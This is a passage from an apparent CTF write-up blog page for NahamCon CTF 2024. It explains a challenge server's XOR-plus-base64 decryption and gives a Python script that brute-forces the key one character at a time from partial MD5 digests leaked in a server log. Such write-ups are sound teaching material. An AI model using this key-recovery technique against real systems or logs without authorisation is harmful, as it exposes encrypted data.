</span></span><span class="line"><span class="cl">    <span class="n">dec_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc_bytes</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># md5(b64decoded XOR key)</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec_bytes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">enc_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Partial message digest is </span><span class="si">{</span><span class="n">md5</span><span class="p">(</span><span class="n">dec_bytes</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">dec_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="s1">&#39;backslashreplace&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="s2">&#34;Message fully decrypted, ready to send...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decrypted</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The message is decrypted with this steps</p>
<ol>
<li>The decrypt function works by accepting a ciphertext (<code>base64 encoded</code>) message.</li>
<li>Expand the key by repeating it enough times to match the length of the ciphertext.</li>
<li>Decode the ciphertext <code>from base64</code> and iterate.</li>
<li>For each iteration it performs <code>XOR</code> operation between the <code>base64 decoded ciphertext</code> and the <code>key</code>. Both are in bytes.</li>
<li>Then converts it to <code>MD5</code> that we see in the server logs.</li>
</ol>
<h3 id="decryptpy" class="headerLink">
    <a href="#decryptpy" class="header-mark"></a>decrypt.py</h3><p>For my solution. I just tried iterating all printable ascii characters for the key until it matched the MD5 when XORed into the ciphertext.
and then add that character to the known value of the key. This decrypts the captured MD5 and b64 in the log file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">server</span> <span class="kn">import</span> <span class="n">decrypt</span> 
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">b64_map</span> <span class="o">=</span> <span class="p">{}</span> <span class="c1"># { b64: [md5, md5...], b64: [md5, md5] }</span>
</span></span><span class="line"><span class="cl"><span class="n">logs</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="n">keys</span> <span class="o">=</span> <span class="p">[]</span> 
</span></span><span class="line"><span class="cl"><span class="n">b64</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brute_force_key</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">target_md5</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">factor</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span> <span class="o">//</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">*</span> <span class="n">factor</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_bytes</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">enc_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">dec_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">enc_bytes</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec_bytes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">enc_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span>  <span class="n">md5</span><span class="p">(</span><span class="n">dec_bytes</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="n">target_md5</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># parse decrpytion server log</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;decryption_server.log&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">logs</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">log</span> <span class="ow">in</span> <span class="n">logs</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">b64_match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;Received encrypted message (.*)&#34;</span><span class="p">,</span> <span class="n">log</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">b64_match</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">b64</span> <span class="o">=</span> <span class="n">b64_match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">longest</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;Partial message digest is (.*)&#34;</span><span class="p">,</span> <span class="n">log</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="k">match</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">hash_</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">b64_map</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">b64</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">b64_map</span><span class="p">[</span><span class="n">b64</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">hash_</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">b64_map</span><span class="p">[</span><span class="n">b64</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="n">hash_</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># brute force key in hash</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="n">b64_map</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">md5_hash</span> <span class="ow">in</span> <span class="n">b64_map</span><span class="p">[</span><span class="n">target</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload</span> <span class="o">=</span> <span class="n">key</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">key_part</span> <span class="o">=</span> <span class="n">brute_force_key</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">md5_hash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">key_part</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">key</span> <span class="o">+=</span> <span class="n">key_part</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">keys</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;key used for encryption:&#34;</span><span class="p">,</span> <span class="nb">max</span><span class="p">(</span><span class="n">keys</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;key.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">    <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">max</span><span class="p">(</span><span class="n">keys</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;decrypted text &#34;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">b64_map</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><a class="lightgallery" href="/nahamcon-ctf-2024/image-10.png" title="/nahamcon-ctf-2024/image-10.png" data-thumbnail="/nahamcon-ctf-2024/image-10.png">
        <img
            
            loading="lazy"
            src="/nahamcon-ctf-2024/image-10.png"
            srcset="/nahamcon-ctf-2024/image-10.png, /nahamcon-ctf-2024/image-10.png 1.5x, /nahamcon-ctf-2024/image-10.png 2x"
            sizes="auto"
            alt="/nahamcon-ctf-2024/image-10.png" height="191"  width="100%" >
    </a>
<!-- ![Alt text](image-10.png) -->
<!-- ![Alt text](image-9.png) --></div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2024-05-29</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="https://xeunwa.github.io/nahamcon-ctf-2024/" data-title="NahamCon CTF 2024 - writeups" data-hashtags="WebDav,flask,flask Session,Code Review,WordPress,Brute-Force"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Instapaper" data-sharer="instapaper" data-url="https://xeunwa.github.io/nahamcon-ctf-2024/" data-title="NahamCon CTF 2024 - writeups" data-description="WebDav, A lot of Brute-forcing &#43; Wordpress whitebox"><span data-svg-src="/lib/simple-icons/icons/instapaper.min.svg"></span></button></div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/webdav/">WebDav</a>,&nbsp;<a href="/tags/flask/">Flask</a>,&nbsp;<a href="/tags/flask-session/">Flask Session</a>,&nbsp;<a href="/tags/code-review/">Code Review</a>,&nbsp;<a href="/tags/wordpress/">WordPress</a>,&nbsp;<a href="/tags/brute-force/">Brute-Force</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/time-traveler/" class="prev" rel="prev" title="osu!gaming CTF 2024 - osint/time-traveler"><i class="fas fa-angle-left fa-fw"></i>osu!gaming CTF 2024 - osint/time-traveler</a>
            <a href="/huntress-ctf-2024/" class="next" rel="next" title="Huntress CTF 2024 - writeups">Huntress CTF 2024 - writeups<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
</article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.131.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div></footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"data":{"desktop-header-typeit":"xeunwa","mobile-header-typeit":"xeunwa"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":300,"threshold":0.1,"type":"fuse","useExtendedSearch":false},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
</body>

</html>